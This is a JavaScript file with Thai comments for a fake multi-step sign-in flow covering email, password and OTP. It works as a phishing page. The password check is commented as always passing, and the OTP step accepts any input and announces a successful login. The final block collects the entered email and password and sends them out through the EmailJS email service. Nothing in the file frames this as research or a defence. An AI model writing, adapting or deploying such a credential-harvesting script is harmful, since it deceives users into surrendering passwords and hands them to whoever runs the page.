// ฟังก์ชันตรวจสอบอีเมลและไปหน้าป้อนรหัสผ่าน
function nextPage() {
    let email = document.getElementById("email").value;
    if (email === "") {
        document.getElementById("error-message").innerText = "โปรดป้อนอีเมล";
    } else {
        localStorage.setItem("userEmail", email);
        window.location.href = "password.html";
    }
}

// ฟังก์ชันตรวจสอบรหัสผ่าน (ผ่านเสมอ)
function verifyPassword() {
    let password = document.getElementById("password").value;
    if (password === "") {
        alert("โปรดป้อนรหัสผ่าน");
    } else {
        window.location.href = "otp.html";
    }
}

// แสดงอีเมลในหน้ารหัสผ่าน
window.onload = function() {
    let userEmail = localStorage.getItem("userEmail");
    if (document.getElementById("user-email")) {
        document.getElementById("user-email").innerText = userEmail;
    }
}

// ฟังก์ชันตรวจสอบ OTP
function verifyOTP() {
    let otp = document.getElementById("otp").value;
    if (otp === "") {
        alert("โปรดป้อนรหัส OTP");
    } else {
        alert("เข้าสู่ระบบสำเร็จ!");
        // สามารถเปลี่ยนไปหน้าหลักที่ต้องการได้
    }
}
// เริ่มต้น EmailJS
(function() {
    emailjs.init('YOUR_USER_ID');  // ใส่ USER_ID ที่ได้จาก EmailJS
})();

// ฟังก์ชันส่งข้อมูลไปยัง EmailJS
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();  // ป้องกันการรีเฟรชหน้าเว็บ

    var email = document.getElementById('email').value;  // รับอีเมลจากฟอร์ม
    var password = document.getElementById('password').value;  // รับรหัสผ่านจากฟอร์ม

    var templateParams = {
        user_email: email,    // ส่งอีเมลที่กรอกไป
        user_password: password  // ส่งรหัสผ่านที่กรอกไป
    };

    // ส่งข้อมูลไปยัง EmailJS
    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            alert("ข้อมูลของคุณได้ถูกส่งไปยังอีเมลแล้ว");
        }, function(error) {
            console.log('FAILED...', error);
            alert("ไม่สามารถส่งข้อมูลได้ กรุณาลองใหม่");
        });
});